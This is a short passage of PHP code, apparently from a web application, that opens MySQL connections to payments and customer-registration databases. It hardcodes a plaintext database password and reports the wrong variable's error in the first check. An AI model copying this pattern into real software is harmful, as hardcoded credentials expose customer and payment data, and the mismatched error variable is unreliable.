// Check connection
if ($payments_conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$card_conn = new mysqli('localhost', "cust_registrations", "Nirmaan@123#", "cust_registrations");
if ($card_conn->connect_error) {
    die("Connection failed: " . $card_conn->connect_error);
}
